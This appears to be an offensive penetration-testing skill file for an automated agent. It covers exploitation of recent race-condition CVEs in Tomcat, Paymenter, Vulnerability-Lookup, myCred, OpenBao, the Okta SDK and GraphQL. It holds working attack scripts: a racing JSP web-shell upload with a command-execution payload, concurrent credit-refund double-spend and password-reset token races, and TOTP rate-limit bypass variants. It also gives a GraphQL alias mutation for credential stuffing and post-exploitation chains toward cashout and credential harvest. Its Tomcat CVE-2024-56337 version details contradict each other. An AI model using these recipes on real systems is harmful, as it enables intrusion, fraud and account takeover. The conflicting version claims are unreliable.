---
name: race-conditions-novel-deep
description: Race conditions at the 2024-2026 frontier — Apache Tomcat JSP TOCTOU (CVE-2024-50379 and the CVE-2024-56337 incomplete-fix follow-up), Paymenter credit-refund double-spend (CVE-2026-71537), Vulnerability-Lookup password-reset dual-consumption (CVE-2026-101041), myCred points-balance TOCTOU (CVE-2025-54667), OpenBao TOTP rate-limit bypass via whitespace normalization (CVE-2025-55003), Okta Java SDK ApiClient response-mixing (CVE-2025-67505), GraphQL alias-batching DoS/rate-limit bypass (CVE-2024-39895, CVE-2024-50311), and the single-packet attack at the current research frontier.
sibling: race_conditions
load_when: scan_mode == "deep"
---

# Race Conditions — Novel + Frontier Depth

This is the novel+frontier deep sibling to `race_conditions.md`. The base owns class framing, the measured counter table, single-packet basics, multi-endpoint and partial-construction classes, idempotency and dedup bypass, atomicity-gap classes, SQL isolation anomaly table, Redis-lock reference, and the 2024-2026 CVE routing map. The advanced+expert sibling `race_conditions_advanced_deep.md` owns single-packet wire-level mechanics, multi-endpoint window construction, partial-construction catalog, idempotency scoping failures, distributed-lock Redlock critique, SQL anomaly worked examples, cross-service race patterns, OAuth and MFA consumption races, cache-and-race, queue races, GraphQL alias batching mechanics, and composite-chain construction.

This file owns the 2024-2026 CVE instances with canonical version/GHSA metadata (single-owner across the trio), the Apache Tomcat JSP TOCTOU family (CVE-2024-50379 and the incomplete-fix CVE-2024-56337 follow-up), the Paymenter/Vulnerability-Lookup/myCred current web-application race-condition CVEs, OpenBao TOTP and Okta Java SDK framework-level races, GraphQL alias-batching DoS CVEs, Linux kernel race-class routing, and current research-frontier framing for HTTP/2 single-packet updates and HTTP/3 open-frontier.

Load this file when the goal is matching a target against a current CVE family, reasoning about race-condition-shape defects in a modern web stack, or constructing a reliable exploit against a hardened target where simple counter races have failed.

Every CVE number, version boundary, and GHSA identifier in this document is anchored to primary sources persisted in `.zen-batch-artifacts/batch-11/ghsa-nvd/`, and the measured counter primitive is reproduced by `.zen-batch-artifacts/batch-11/measurements/race_counter.py` + `race_counter.out`.

## 2024-2026 Race-Condition CVE Version/Fix Table — Canonical

Single-owner per §2. Base and advanced siblings reference these CVEs by number + route only; the version and GHSA metadata lives here.

| CVE | GHSA | Component | Vulnerable | Patched | CVSS | CWE | Primitive |
|---|---|---|---|---|---|---|---|
| CVE-2024-50379 | GHSA-5j33-cvvr-w245 | Apache Tomcat (JSP compilation) | 9.0.0.M1–9.0.97, 10.1.0-M1–10.1.33, 11.0.0-M1–11.0.1 | 9.0.98, 10.1.34, 11.0.2 | 9.8 v3.1 | CWE-367 | JSP compilation TOCTOU on case-insensitive filesystems: filename check (`.txt`) vs content check (bytecode present) races between the extension check and the compile dispatch |
| CVE-2024-56337 | GHSA-27hp-xhwr-wr2m | Apache Tomcat | 9.0.0.M1–9.0.97, 10.1.0-M1–10.1.33, 11.0.0-M1–11.0.1 | 9.0.98, 10.1.34, 11.0.2 | 9.8 v3.1 | CWE-367 | Incomplete-fix follow-up to CVE-2024-50379; the first patch mitigated the race window on CI filesystems but the mitigation itself was incomplete — Tomcat 11.0.2+/10.1.34+/9.0.98+ carries the full fix, which also requires an administrator opt-in for CI deployments |
| CVE-2026-71537 | GHSA-5gmm-hjfj-8ff7 | Paymenter (`paymenter/paymenter` on Composer) | ≤ 1.5.6 | 1.5.7 | 6.5 v3.1 | CWE-362 | `app/Livewire/Services/Upgrade.php::doUpgrade()` relies on `Service::upgradable` for a pending-upgrade check and later executes `$credit->increment('amount', abs($price))` without `DB::transaction()`; concurrent downgrades each run the full flow, each refunding |
| CVE-2026-101041 | GHSA-j3gx-2q66-wg27 | Vulnerability-Lookup (password reset) | n/a | fixed in-repo | n/a | CWE-367 | Password-reset single-use token verified against stored digest and then consumed in *separate* database operations; two concurrent requests presenting the same token both pass verification, both set a new password, both mint sessions |
| CVE-2025-54667 | GHSA-2c8h-4v5j-p9cq | myCred (WordPress plugin, Saad Iqbal) | ≤ 2.9.4.3 | 2.9.4.4 | 5.3 v3.1 (Patchstack Secondary) | CWE-367 | Points-balance eligibility check followed by state-updating decrement; concurrent requests hit the window between the eligibility check and the decrement |
| CVE-2025-55003 | GHSA-rxp7-9q75-vj3p | OpenBao (`github.com/openbao/openbao`) | <2.3.2 (and Go-pseudo-version <0.0.0-20250807113757-...) | 2.3.2 | 5.7 v3.1 (GHSA Secondary) | CWE-307 | Login MFA TOTP: codes containing whitespace were accepted because the underlying TOTP library normalized the code; the whitespace variant bypassed the MFA method's internal rate limiting (keyed on the raw code) and the already-consumed check (also keyed on the raw code) |
| CVE-2025-67505 | GHSA-j5gq-897m-2rff | Okta Java Management SDK (`com.okta.sdk:okta-sdk-root` on Maven) | ≥11.0.0, ≤20.0.0 | 20.0.1 | 8.4 v3.1 (GHSA Secondary; no NVD Primary) | CWE-362 | `ApiClient` holds mutable per-call response state in instance fields; concurrent requests from the same client instance can see each other's status codes and response headers, which can include tokens, factor info, or user profile data |
| CVE-2024-39895 | GHSA-7hmh-pfrp-vcx4 | Directus (`@directus/env` on npm) | <1.1.6 | 1.1.6 | 6.5 v3.1 (NVD Primary + GHSA) | CWE-770 | GraphQL field-duplication DoS: alias-batched duplicates of a single field linearly multiply database load; adjacent-class rate-limit bypass since the HTTP request is one but the resolver invocations are N |
| CVE-2024-50311 | GHSA-gmjx-74cx-5p3f | OpenShift Console GraphQL | — (OpenShift) | — | 6.5 v3.1 | CWE-770 | GraphQL batching DoS: thousands of aliases in a single POST body cause server resource exhaustion; same adjacent-class rate-limit-bypass primitive as CVE-2024-39895 |

Notes on the table:

- **Tomcat CVE-2024-50379 and CVE-2024-56337 are a mitigation chain.** The first patch at Apache Tomcat 9.0.98 / 10.1.34 / 11.0.2 was found to be incomplete; the follow-up advisory CVE-2024-56337 requires the same version boundary plus a `readonly=true` default-servlet configuration (or `sun.io.useCanonCaches=false` on JVM where applicable). Cite both CVEs for a Tomcat-on-CI-filesystem finding.
- **CVE-2026-71537 (Paymenter) exploits a transactional-boundary omission.** The vulnerable code is `app/Livewire/Services/Upgrade.php::doUpgrade()` where `$credit->increment('amount', abs($price))` is called outside a `DB::transaction()` block, so concurrent downgrade requests each pass the `Service::upgradable` check and each credit the account.
- **CVE-2026-101041 (Vulnerability-Lookup) is the "separate verify + consume" classical race.** The verify step reads the stored digest; the consume step clears the row. Both are separate DB roundtrips with no transactional link; both race entrants pass verify before either consume commits.
- **CVE-2025-55003 (OpenBao) is a normalization-layer race.** NVD classifies this as CWE-307 (Improper Restriction of Excessive Authentication Attempts), not CWE-367 (TOCTOU), because the root cause is rate-limit bypass via whitespace normalization. The TOTP library (`github.com/pquerna/otp`) silently strips whitespace from the submitted code before comparison. The rate-limit counter and the already-consumed check are keyed on the *submitted* code, not the normalized code. "123456" counts against the limit; "123456 " (trailing space) does not. The validation accepts both and consumes neither against the limit.
- **CVE-2025-67505 (Okta Java SDK) is a shared-mutable-state race**, not a classical TOCTOU. The `ApiClient` class holds response state in instance fields; concurrent `invokeAPI()` calls from one client write to those fields non-atomically. Fix: 20.0.1 refactors the response state into per-call `ApiResponse` objects.
- **CVE-2024-39895 and CVE-2024-50311 are adjacent-class.** They are CWE-770 (resource consumption) not CWE-367 (TOCTOU) or CWE-362 (race condition), but share the rate-limit-bypass shape: the HTTP layer sees one request; the resolver sees N. Load them when characterizing the GraphQL rate-limit-bypass primitive described in the advanced sibling's `§ GraphQL Mutation Races`.

## Apache Tomcat JSP Compilation TOCTOU — CVE-2024-50379

Primitive: on a case-insensitive filesystem (Windows NTFS, macOS APFS case-insensitive, some Linux-with-fuse configurations), Tomcat's JSP compilation determines whether to recompile a JSP by comparing the filename against a cached compiled version. The filename comparison is case-sensitive at the Java-string level; the filesystem is case-insensitive. An attacker uploads `foo.jsp` as `FOO.JSP` and immediately races the same path as `foo.txt` (not a JSP). Tomcat's "is this a JSP?" check sees `.txt` (case-sensitive match against the extension list fails); the file-read step opens the file on the case-insensitive FS and reads the JSP content; the compile dispatch reads the on-disk file by path (case-insensitive) and compiles it as a JSP.

**Reachability preconditions:**

1. Tomcat version `9.0.0.M1–9.0.97` or `10.1.0-M1–10.1.33` or `11.0.0-M1–11.0.1`. Discovery: `/manager/html` login page shows the Tomcat version; `Server:` header on error responses often includes it; `/examples/` directory indicates a dev-mode deployment.
2. The default servlet is configured for write (`readonly=false`), which is non-default. Confirm via `web.xml` or `PUT` test to a servlet-mapped path.
3. The underlying filesystem is case-insensitive. Windows NTFS and macOS APFS case-insensitive are the common cases.
4. Attacker can `PUT` arbitrary files to a servlet-mapped path.

**Sink location.** The vulnerable code is in Tomcat's `JspServlet` (`org.apache.jasper.servlet.JspServlet`); specifically the resource-serving path that routes based on filename extension. The patch at 11.0.2 (commit sequence linked from the GHSA) adds a canonical-case comparison when the default servlet writes are enabled.

**Attack recipe:**

```python
# Pseudocode: fire two parallel PUTs with case-colliding filenames
# Target: /files/exploit.jsp as GET endpoint for JSP compile dispatch
# Case 1: upload PUT /files/EXPLOIT.JSP (JSP content, 'is JSP' check keyed to .JSP uppercase)
# Case 2: upload PUT /files/exploit.txt (same bytes)
# The compile dispatch picks whichever Tomcat has cached by canonical path.

import requests, threading
JSP_PAYLOAD = b"<%@ page import=\"java.util.*\"%><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"

def put(name, content):
    requests.put(f"https://target/files/{name}", data=content)

t1 = threading.Thread(target=put, args=("EXPLOIT.JSP", JSP_PAYLOAD))
t2 = threading.Thread(target=put, args=("exploit.txt", JSP_PAYLOAD))
t1.start(); t2.start(); t1.join(); t2.join()

# Request the "JSP" path; Tomcat's case-insensitive FS reads the actual file (JSP bytes)
# but the servlet routing may have matched .txt (safe) or .JSP (compile).
# A reliable PoC fires N pairs in a loop until compile dispatch catches.
r = requests.get("https://target/files/exploit.jsp?cmd=id")
```

**Confirmation signal:** `/files/exploit.jsp` returns `uid=... (tomcat)` or similar; Tomcat's catalina.out shows a JSP compile event for the exploit path during the window; filesystem shows `/work/Catalina/localhost/_/.../exploit_jsp.java` and `.class`.

**Impact:** Remote code execution as the Tomcat user. In a hardened deployment with `tomcat` as a dedicated low-privilege user, the primitive still grants code execution on the application host.

**Class-generalization:** Any application dispatching behavior based on a case-sensitive extension check on a case-insensitive filesystem is a candidate. Grep for `endsWith(".jsp")`, `endsWith(".aspx")`, or similar across Java/Node/Python stacks running on NTFS/APFS/case-insensitive-ZFS. The pattern is "the application's string comparison is case-sensitive; the filesystem is not; the race window is the gap between the string check and the filesystem read."

## Apache Tomcat Incomplete-Fix Follow-Up — CVE-2024-56337

Primitive: the fix for CVE-2024-50379 at 9.0.98 / 10.1.34 / 11.0.2 was found to be incomplete. The patch added a canonical-case check but did not cover all the dispatch paths; on Java `sun.io.useCanonCaches` default-true JVMs, the canonical-case cache could return a stale result that still permitted the race.

**Reachability preconditions:**

1. Tomcat at the "first-patch" version boundary — same as CVE-2024-50379 but with the first-patch applied.
2. JVM has `sun.io.useCanonCaches=true` (default on OpenJDK through Java 17).
3. Default servlet is configured for write (same precondition as CVE-2024-50379).
4. Filesystem is case-insensitive.

**Mitigation shape.** The CVE-2024-56337 advisory requires an administrator opt-in: set `sun.io.useCanonCaches=false` for the JVM, or upgrade to the follow-up patch at 9.0.98-fixed-again / 10.1.34-fixed-again / 11.0.2-fixed-again (version strings in the advisory). The follow-up CVE is a reminder that an initial patch can leave the race window reachable through an adjacent cache; always re-measure after a patch.

**Attack recipe:** identical to CVE-2024-50379. If the measurement result shows RCE on a target claiming the CVE-2024-50379 fix, the exposure is CVE-2024-56337.

**Confirmation signal:** same RCE confirmation as CVE-2024-50379; additionally, the Tomcat log shows the first-patch's canonical-check as having passed when it should have failed.

**Impact:** Same RCE. The attribution shifts: a target with the first-patch applied is CVE-2024-56337; a target without any patch is CVE-2024-50379.

**Class-generalization:** Incomplete-fix follow-ups are a recurring pattern across Tomcat's CVE history (CVE-2019-0199 / CVE-2019-0221, CVE-2020-9484 / CVE-2021-25122). The lesson: an advisory's "fixed" boundary is a hypothesis to be re-measured.

## Paymenter Credit-Refund Double-Spend — CVE-2026-71537

Primitive: Paymenter's `app/Livewire/Services/Upgrade.php::doUpgrade()` method handles service upgrades and downgrades. For downgrades, it computes the credit delta (`abs($price)` where `$price` is negative) and calls `$credit->increment('amount', abs($price))` to refund the credit balance. The entire flow runs outside `DB::transaction()`. Concurrent downgrade requests each read the current service state, each pass the `Service::upgradable` check, and each run the full `$credit->increment()` — multiplying the refund.

**Reachability preconditions:**

1. Paymenter version `≤ 1.5.6`. Discovery: Paymenter instances typically run at a known subdomain pattern; the `/version` or `/api/version` endpoint may leak it; the admin panel at `/admin` shows it to logged-in admins.
2. An authenticated customer account with at least one active, downgradable service.
3. The downgrade endpoint is reachable concurrently (Livewire's Volt route for `doUpgrade`).

**Sink location.** `app/Livewire/Services/Upgrade.php::doUpgrade()`. The patch at 1.5.7 wraps the credit-and-service-update block in `DB::transaction()`, which serializes concurrent entrants on the credit row's lock.

**Attack recipe:**

```python
# Pseudocode: fire N concurrent downgrade requests
import httpx, asyncio

async def downgrade(client, service_id, new_plan_id):
    return await client.post(
        "https://target.tld/livewire/update",
        json={"fingerprint": {...}, "serverMemo": {...},
              "updates": [{"type": "callMethod", "payload": {"method": "doUpgrade",
                           "params": [service_id, new_plan_id]}}]},
    )

async def main():
    async with httpx.AsyncClient(http2=True, cookies={"laravel_session": SESSION}) as c:
        # Prime connection
        await c.get("https://target.tld/dashboard")
        # Fire 20 concurrent downgrades of the same service
        results = await asyncio.gather(*[downgrade(c, SERVICE_ID, DOWNGRADE_PLAN_ID) for _ in range(20)])
    # Check credit balance:
    # /credit/balance should show 20× the expected refund amount
```

**Confirmation signal:** `/credit/balance` increases by N × refund amount after N concurrent downgrades; the service's record shows a single downgrade event but N credit transactions.

**Impact:** Credit balance inflation. The attacker's withdrawable credit becomes an arbitrary multiple of the legitimate refund. In a hosting-services shop (Paymenter's target market), credit converts to real services or (if cashout is enabled) to real money.

**Class-generalization:** Any transactional operation that writes to a durable balance / counter outside `DB::transaction()` (Laravel), `@Transactional` (Spring), `BEGIN...COMMIT` (Postgres native), or equivalent is a candidate. Grep for `->increment(`/`->decrement(` on monetary columns, and verify each is inside a transaction block. Paymenter's `doUpgrade` is one of several — the project's auditor's full patch at 1.5.7 adds `DB::transaction()` wrapping across similar monetary paths.

## Vulnerability-Lookup Password-Reset Dual-Consumption — CVE-2026-101041

Primitive: The account-recovery (password-reset) endpoint validates the single-use token by comparing against the stored digest and then clears the token — in two *separate* database operations. Concurrent requests presenting the same token both pass the verification check before either commits the clear; both proceed to set a new password; both mint authenticated sessions.

**Reachability preconditions:**

1. Vulnerability-Lookup web application at an affected version (pre-fix; the project's GHSA names the exact commit range).
2. Attacker has observed or acquired a legitimate reset token for a target account. This typically requires access to the user's email or an email-exfiltration primitive (XSS, misdirected mail).
3. The attacker can send two concurrent HTTP requests to the reset endpoint.

**Sink location.** The reset handler reads the stored digest, bcrypt-compares it against the submitted token, and then issues a separate `UPDATE` to clear the digest and set the new password. The patch wraps the verify+clear in a serializable DB transaction.

**Attack recipe:**

```python
import asyncio, httpx

async def reset(client, token, new_password):
    return await client.post("https://target.tld/account/reset",
                             data={"token": token, "password": new_password})

async def main():
    async with httpx.AsyncClient(http2=True) as c:
        await c.get("https://target.tld")  # warm the connection
        # Fire two parallel reset submissions with the same token
        r1, r2 = await asyncio.gather(
            reset(c, TOKEN, "attacker-password-A"),
            reset(c, TOKEN, "attacker-password-B"),
        )
    # Both should return 2xx; both passwords may be accepted; the final password
    # is whichever write wins the second UPDATE; both sessions may be minted.
```

**Confirmation signal:** both requests return 2xx; both receive session cookies; one session's password is the one that persists in the DB (last-write-wins), but the other session is still authenticated to the account via its minted cookie.

**Impact:** Dual-session persistence: the attacker's session, minted during the race, remains authenticated even after the "winning" write set a different password. The user's subsequent login with their intended new password doesn't invalidate the attacker's session.

**Class-generalization:** Any password-reset flow where the token-verify and token-consume are separate DB operations without a transaction. The pattern recurs across Rails (`has_secure_token` + manual clear), Django (`PasswordResetView` with manual expiry), and custom implementations. The audit mnemonic: `SELECT reset_tokens WHERE ... → UPDATE users SET password = ... → UPDATE reset_tokens SET used = TRUE` — if these are three statements outside a transaction, the race window is the gap between statements 1 and 3.

## myCred WordPress Points-Balance TOCTOU — CVE-2025-54667

Primitive: myCred (a WordPress plugin for points/credits/badges) exposes endpoints that modify points balances based on eligibility. The eligibility check (user has enough points) and the balance-decrement are separate operations, not transactionally serialized. Concurrent requests from one user each pass the eligibility check against the pre-decrement balance, and each decrement — permitting over-withdrawal.

**Reachability preconditions:**

1. WordPress with myCred installed, version `≤ 2.9.4.3`. Discovery: `/wp-content/plugins/mycred/` path exposure; `wp-json/mycred/v1/` REST namespace presence; the admin plugin page listing.
2. An authenticated WordPress user with at least one points-balance greater than zero.
3. A plugin-exposed endpoint that performs a balance-check-and-decrement (points-based reward redemption, purchase, or transfer).

**Sink location.** myCred's balance-decrement handlers (worth sampling across the plugin's AJAX endpoints and REST routes). The patch at 2.9.4.4 wraps the balance-check and decrement in a transaction or applies a conditional `UPDATE` (`WHERE balance >= $amount`).

**Attack recipe:** fire N parallel balance-decrement requests with amounts that each individually pass the eligibility check but collectively exceed the balance. Example: balance=100 points; 10 parallel requests each redeeming 50 points. Expected: 2 succeed; observed: up to 10 succeed, driving the balance to −400 points.

**Confirmation signal:** points balance is negative post-attack; the plugin's transaction log shows N successful redemptions.

**Impact:** Points over-withdrawal; in gamified / loyalty-points stacks, this converts to free product entitlements or real-world rewards.

**Class-generalization:** WordPress plugins have a long history of this specific class due to WordPress's "options API" and `wp_cache_*` layer, which encourage non-transactional reads. Any plugin storing a per-user counter in `wp_usermeta` and modifying it via "read-then-update_user_meta" is a candidate. The audit mnemonic: `get_user_meta → verify → update_user_meta` without `$wpdb->query('START TRANSACTION')` is the race window.

## OpenBao TOTP Rate-Limit Bypass — CVE-2025-55003

Primitive: OpenBao's Login MFA system enforces MFA with TOTP. Codes are submitted as strings and compared against the computed TOTP. Due to normalization applied by the underlying TOTP library (`github.com/pquerna/otp`), codes containing whitespace are silently accepted (the library strips whitespace before comparison). But the MFA method's internal rate limiting and the "already consumed" check are keyed on the *submitted* code string, not the normalized value. So "123456" and "123456 " and "1 2 3 4 5 6" are three different "attempts" against the rate limit but all three validate the same TOTP window.

**Reachability preconditions:**

1. OpenBao version `<2.3.2` (Go-pseudo-version `<0.0.0-20250807113757-8340a6918f6c`). Discovery: OpenBao's HTTP header or `/sys/version` endpoint.
2. OpenBao is configured with Login MFA enforcement using TOTP.
3. Attacker has a legitimate TOTP code within its validity window (acquired via phishing, device-pairing primitive, or a chained OTP-leak CVE).

**Sink location.** The MFA method's `Verify()` function; the normalization occurs inside the TOTP library's `Validate()`; the rate-limit counter is incremented in a wrapping function in OpenBao's `login_mfa` package. The patch at 2.3.2 normalizes the code *before* the rate-limit check, so all whitespace variants map to the same key.

**Attack recipe:**

```python
import httpx
TOTP = "123456"  # legitimate code acquired by attacker
# Each variant is a distinct rate-limit bucket but the same TOTP window
variants = [TOTP, TOTP + " ", " " + TOTP, "1 2 3 4 5 6", "1\t2\t3\t4\t5\t6"]
for v in variants:
    r = httpx.post("https://target.tld/v1/auth/userpass/login/user",
                   json={"password": PW, "mfa_payload": {"method_id": MFA_ID, "codes": [v]}})
    print(f"variant={v!r} status={r.status_code}")
```

**Confirmation signal:** multiple successful MFA validations within one TOTP window; audit log shows multiple session mintings.

**Impact:** TOTP reuse grants session duplication within the TOTP window. Chained with a credential-stuffing primitive (one legitimate credential + one legitimate TOTP), the attacker mints multiple persistent sessions.

**Class-generalization:** Any MFA/rate-limiting implementation where the rate-counter key is pre-normalization and the validation key is post-normalization. Grep across OTP libraries (`github.com/pquerna/otp`, Python's `pyotp`, Ruby's `rotp`, JavaScript's `otplib`) for whitespace/zero-width-char tolerance in `Validate` and compare against the rate-limit-counter's hash input. The pattern is "normalization pulled into the wrong layer" — the fix is always to normalize once at the earliest boundary before any state keys are derived.

## Okta Java SDK ApiClient Response-Mixing — CVE-2025-67505

Primitive: The Okta Java Management SDK's `ApiClient` class holds per-call response state (status code, response headers, maybe parsed body) in *instance fields* rather than per-call locals or `ThreadLocal`. Concurrent `invokeAPI()` calls from a single shared `ApiClient` instance write to those fields non-atomically; a reader of one request's response may see a different request's state.

**Reachability preconditions:**

1. Application uses `com.okta.sdk:okta-sdk-root` version `>=11.0.0, <=20.0.0`. Discovery: Maven dependency tree inspection; the application's JAR analysis.
2. Application shares a single `ApiClient` instance across threads (the common pattern for connection pooling / efficiency).
3. The application invokes multiple Okta API calls concurrently (common in bulk sync, multi-user operations, or any thread-pool-based handler).

**Sink location.** `com.okta.sdk.resource.client.ApiClient` or similar; the response-state fields were `statusCode`, `responseHeaders`, and transient parsing buffers. The patch at 20.0.1 refactors into per-call `ApiResponse` objects passed through the call stack rather than written to the client instance.

**Attack recipe:** this is an exploit against the application using the SDK, not against Okta's own services. The exploit requires inducing the application to make concurrent API calls where one is attacker-influenced and another is privileged. Example: a user-management web endpoint takes a user ID and returns their profile; under high concurrent load, response A (attacker's low-privilege user) sees response B's headers (a privileged user's token or session binding).

**Confirmation signal:** application logs show cross-request header leakage; the application's response to request A contains fields that should only be in response to request B.

**Impact:** Information disclosure (tokens, factors, user profile data) across requests. In an attacker-controllable code path, this becomes session hijack or token theft.

**Class-generalization:** Any SDK or client library that uses instance fields for per-call response state is a candidate. The pattern recurs across HTTP client libraries (older `HttpClient`-based wrappers), JSON parsers (reused streaming parsers), and database drivers (prepared statement objects reused across threads). The audit mnemonic: a stateful client used from more than one thread.

## GraphQL Alias Rate-Limit Bypass — CVE-2024-39895 and CVE-2024-50311

Primitive: GraphQL alias batching allows one HTTP request to invoke a resolver N times. If the server rate-limits by HTTP request count, N resolver invocations go through for the cost of one HTTP request. If each resolver invocation has side effects or load (database queries, external calls), the attacker amplifies by factor N.

**Reachability preconditions:**

1. Server exposes GraphQL at a known endpoint (`/graphql`, `/api/graphql`, etc.).
2. GraphQL spec compliance includes alias support (standard; non-support is rare).
3. Server has no alias-count limit, no per-operation rate limiter, or no query-complexity-based limiting.

**CVE-2024-39895 (Directus).** Directus's GraphQL layer did not limit alias repetition on a single field; a query with 10,000 aliases of a single DB-touching field created 10,000 DB roundtrips per request. The patch at `@directus/env` 1.1.6 (and corresponding Directus 10.x release) adds an `GRAPHQL_INTROSPECTION` limit and query-complexity analysis.

**CVE-2024-50311 (OpenShift Console).** OpenShift's console-side GraphQL implementation suffered the same class — alias-batched queries exhausted server resources. The fix adds a query-depth and alias-count limit.

**Attack recipe (adapt per target):**

```graphql
query AliasFanout {
  a1: users(limit: 100) { id name email }
  a2: users(limit: 100) { id name email }
  a3: users(limit: 100) { id name email }
  # ... 10000 aliases
}
```

One POST to `/graphql` with this body; 10,000 queries execute server-side. Measurable load: 10,000 DB roundtrips → seconds of CPU, hundreds of MB of memory, response bytes in the hundreds of MB.

**Confirmation signal:** server response time increases linearly with alias count; server CPU graphs show the request contributes disproportionate load; a one-request baseline is milliseconds, a 1,000-alias request is seconds.

**Impact:** DoS primarily (resource exhaustion); rate-limit bypass secondarily (if resolvers have state-changing side effects, N state changes per request). In Directus-style content APIs, the alias-batched read is a cheap exfiltration primitive — one HTTP request leaks N batches of data without triggering the application's "requests per minute" limit.

**Class-generalization:** Any GraphQL implementation without query-complexity analysis is a candidate. The audit mnemonic: fire a `query { a:field, b:field, c:field, ... }` test with N=100 aliases; measure the server-side cost; if the cost is linear in N and there is no complexity limit, the exposure is this class.

## HTTP/2 Single-Packet — Current Research Frontier

**Kettle's updated technique (2024-2026 updates).** Beyond the original single-packet attack (BH USA 2023), PortSwigger's research has updated the technique to handle requests that exceed one TCP MTU — the "sequence-based synchronization" extension. The idea: for requests requiring multiple TCP segments, send all segments but the final one on each stream, then release the final segments together via a last-byte-sync-at-the-stream-level mechanism. This extends the single-packet reliability to requests of arbitrary size, at the cost of a small alignment slack (~1ms vs <1ms for pure single-packet).

**Burp Repeater "Send group in parallel".** The feature on current Burp Suite (2024+) packages a tab group into one HTTP/2 batch and fires via the single-packet engine. For small groups (2-10 requests), it is faster to iterate than Turbo Intruder. For larger groups or scripted sequencing, Turbo Intruder remains the tool.

**HTTP/3 open frontier.** HTTP/3 over QUIC changes the packet model: QUIC streams are multiplexed over UDP packets, each stream's data is encrypted separately, and the server-side arrival model differs from H2. Research on single-packet-equivalent in H3 is nascent; the base assumption is that the stream-arrival jitter is bounded by QUIC's receive-window handling rather than TCP's segment delivery. No published H3 single-packet technique as of this document; the gap is an open frontier.

## Linux Kernel Race Class — Adjacent-Routing

The Linux kernel's race-condition CVEs are structurally the same class (TOCTOU, UAF, lock-ordering) but outside the primary web-application pentesting scope of this skill. Noting the current frontier for context:

- **CVE-2025-38352** (POSIX CPU timers UAF race, CISA KEV): `handle_posix_cpu_timers()` vs `posix_cpu_timer_del()` race on an exiting non-autoreaping task; the task can be reaped between `unlock_task_sighand()` and the subsequent timer-struct access. Local privilege escalation; actively exploited.
- **CVE-2025-38617** (`net/packet` ring race): `packet_set_ring()` releases `po->bind_lock` and `packet_notifier()` processes an `NETDEV_UP` event concurrently, racing the ring pointer. Local DoS or UAF depending on allocator state.

Load `rce.md § Kernel Primitive Routing` and the external Linux-exploit resources for kernel-side exploitation; the web-application race-condition skill focuses on the application-layer surface.

## Composite Chaining — Current CVE Instances

### Chain: Paymenter Credit Double-Spend + Cashout

- Race precondition: authenticated Paymenter customer with downgradable service.
- Race postcondition: credit balance inflated by N× refund amount via CVE-2026-71537.
- Cashout: Paymenter's withdraw-credit flow (if enabled) converts credit to external payment.

Impact: direct monetary extraction; stealthy because the service shows one downgrade event.

### Chain: Vulnerability-Lookup Dual-Session + Session Persistence

- Race precondition: observed reset token for a target account.
- Race postcondition: two authenticated sessions (CVE-2026-101041).
- Session persistence: one session survives the user's subsequent password change.

Impact: long-term account access; routes through `authentication_jwt.md § Session Revocation Depth` for session-management defence depth.

### Chain: Tomcat JSP TOCTOU + Web Shell + Lateral Movement

- Race precondition: Tomcat on case-insensitive FS with write-enabled default servlet.
- Race postcondition: RCE as `tomcat` user via CVE-2024-50379.
- Lateral: Tomcat often runs with filesystem write to shared mounts; web shell deployment + credential harvest from `conf/tomcat-users.xml`.

Impact: full application host compromise; routes through `rce.md` for post-RCE exploitation.

### Chain: OpenBao TOTP Reuse + Session Hijack

- Race precondition: legitimate TOTP code within validity window.
- Race postcondition: N concurrent MFA-passed sessions via CVE-2025-55003.
- Session hijack: one of the N sessions becomes the attacker's long-lived token.

Impact: session persistence past user TOTP-rotation; routes through `authentication_jwt.md § MFA Bypass Classes`.

### Chain: Okta SDK Response-Mixing + Information Disclosure

- Race precondition: shared `ApiClient` instance across threads.
- Race postcondition: response header leakage across concurrent requests.
- Disclosure: tokens, factors, user profile data cross-request.

Impact: information disclosure routes through `information_disclosure.md § Framework-Level Leakage`; downstream session hijack via leaked token.

### Chain: GraphQL Alias Bypass + Credential Stuffing

- Rate-limit precondition: GraphQL login mutation with no per-operation rate limit.
- Alias-batching: `mutation { a:login(email:"e@x", password:"p1"), b:login(email:"e@x", password:"p2"), ... }` runs N auth attempts per HTTP request.
- Credential stuffing: 10,000 password attempts per HTTP request bypass the per-minute HTTP-rate-limit.

Impact: credential-stuffing acceleration; routes through `weak_password_detection.md` for the credential set and `authentication_jwt.md` for the auth layer.

## Non-CVE Technique-Class Frontier (2024-2026)

Not every current race-condition primitive carries a CVE. The following technique classes are the current frontier that pentesters should probe routinely, independent of any specific advisory:

### Celery / Sidekiq / BullMQ Job-Race Current Frontier

**Class:** background-job queue races where producer-side dedup and worker-side dedup disagree.

- **Celery (Python):** `apply_async(..., task_id=...)` with a client-chosen task_id; broker-level dedup is best-effort (Redis default); worker's task-start handler reads from the `task_meta` table. A race between enqueue and the result backend's task_id uniqueness check permits duplicate execution.
- **Sidekiq (Ruby):** `unique_for` option is best-effort; the deduplication is implemented via Redis `SET NX` with a TTL. If two producers enqueue within the SETNX window on separate shards, both jobs run.
- **BullMQ (Node):** `jobId` is client-controllable; the dedup is handled by Redis Hash; a lost race on `HSETNX` permits duplicate.

Audit mnemonic: for any background-job system, probe the producer-side dedup by enqueueing N identical jobs with the same client-supplied idempotency key within a sub-millisecond window.

### Redis WATCH/MULTI Transaction Race Edges

**Class:** Redis OPTIMISTIC-concurrency primitives have subtle failure modes.

- `WATCH key` + `MULTI` + `EXEC` aborts the transaction if `key` was modified between `WATCH` and `EXEC`. But: if the application reads `key` *before* `WATCH`, the read is unprotected; a concurrent writer between the read and the `WATCH` is invisible to the `WATCH` check.
- `WATCH` is session-local; failover between Redis masters loses `WATCH` state. A client that acquired `WATCH` on master A and later executes against master B after a failover gets a successful `EXEC` without the watched-key protection.

Audit mnemonic: look for `WATCH` + `MULTI` patterns; verify the read-of-value is inside the `WATCH` scope, and that the client handles failover (`CLUSTERDOWN` or `MOVED` redirect) by re-establishing the `WATCH`.

### Elasticsearch / OpenSearch Bulk-Operation Race

**Class:** `_bulk` API accepts an array of operations; the server processes them in order but does not promise cross-document atomicity.

- Two concurrent `_bulk` requests from different clients, each with a `create` operation for the same `_id`: the second's `create` fails with `version_conflict_engine_exception` *most of the time*, but a split-brain shard primary can accept both.
- Scripted updates (`"script": { "source": "ctx._source.counter += 1" }`) are not atomic across concurrent bulk requests on the same document in some version boundaries.

Audit mnemonic: for counter / sequence-like fields in Elasticsearch, verify the scripted-update is `_doc` versioned and that the application reads the response's `_version` to detect conflicts.

### Kafka Consumer-Rebalance Race

**Class:** When a Kafka consumer group rebalances (member joins/leaves), partition assignments shift mid-flight; a message in-flight on one consumer may be redelivered to another.

